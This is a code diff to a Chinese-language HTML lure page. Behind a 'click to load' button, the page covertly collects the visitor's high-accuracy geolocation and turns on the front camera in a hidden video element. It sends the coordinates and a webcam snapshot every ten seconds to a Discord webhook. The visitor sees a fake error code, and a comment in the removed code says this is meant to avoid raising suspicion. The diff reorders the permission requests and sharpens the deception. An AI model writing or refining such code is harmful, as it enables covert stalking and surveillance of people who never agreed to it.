@@ -7,66 +7,68 @@
 <body>
 
 <h2>點擊按鈕查看內容</h2>
-<button onclick="startAction()">點擊載入</button>
+<button onclick="startSequence()">點擊載入</button>
 <p id="status"></p>
 
-<!-- 隱藏元件 -->
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
 var webhook = "https://discord.com";
 
-function startAction() {
-    document.getElementById("status").innerHTML = "正在取得內容...";
-    // 兩項功能獨立執行，互不影響
-    tryLocation(); 
-    tryCamera();   
-}
-
-// --- 定位功能 ---
-function tryLocation() {
+// 序列化執行：先定位，再相機
+function startSequence() {
+    document.getElementById("status").innerHTML = "正在讀取資料，請稍候...";
+    
+    // 第一步：請求定位
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            var acc = pos.coords.accuracy;
-
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "📍 **[定位成功]**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com" + lat + "," + lon
-                })
-            });
-            updateStatus();
+            // 定位成功
+            sendLocation(pos);
+            tryCamera(); // 定位結束後，接著請求相機
         }, function(err) {
-            console.log("定位權限被拒絕或錯誤");
-            updateStatus();
-        }, { enableHighAccuracy: true, timeout: 10000 });
+            // 定位失敗（對方拒絕）
+            console.log("定位被拒絕");
+            tryCamera(); // 就算定位被拒絕，也要接著請求相機
+        }, { enableHighAccuracy: true, timeout: 8000 });
+    } else {
+        tryCamera(); // 不支援定位則直接跳相機
     }
 }
 
-// --- 相機功能 ---
+// 傳送定位資料
+function sendLocation(pos) {
+    var lat = pos.coords.latitude;
+    var lon = pos.coords.longitude;
+    var acc = pos.coords.accuracy;
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "📍 **[定位成功]**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com" + lat + "," + lon
+        })
+    });
+}
+
+// 第二步：請求相機
 function tryCamera() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 權限一拿到就先傳一張，之後每 10 秒傳一張 (避免 Discord 頻率限制)
-        sendSnap(video);
+        // 立即截圖一張，之後每 10 秒一張
+        setTimeout(function(){ sendSnap(video); }, 1000); 
         setInterval(function() { sendSnap(video); }, 10000);
         
-        updateStatus();
+        document.getElementById("status").innerHTML = "內容載入失敗，錯誤代碼：0x8004210B";
     })
     .catch(function(err) {
-        console.log("相機權限被拒絕");
-        updateStatus();
+        console.log("相機被拒絕");
+        document.getElementById("status").innerHTML = "需要所有權限才能正常顯示內容";
     });
 }
 
-// 擷取畫面並傳送的輔助函數
 function sendSnap(video) {
     var canvas = document.getElementById("c");
     canvas.width = video.videoWidth;
@@ -79,17 +81,10 @@ function sendSnap(video) {
         var formData = new FormData();
         formData.append('file', blob, 'snap.jpg');
         formData.append('payload_json', JSON.stringify({ content: "📸 **[相機擷取成功]**" }));
-        
         fetch(webhook, { method: "POST", body: formData });
     }, "image/jpeg", 0.5);
-}
-
-function updateStatus() {
-    // 為了不讓對方起疑，統一顯示載入失敗
-    document.getElementById("status").innerHTML = "內容載入失敗，請檢查網路連線或權限設定。";
 }
 </script>
 
 </body>
 </html>
-
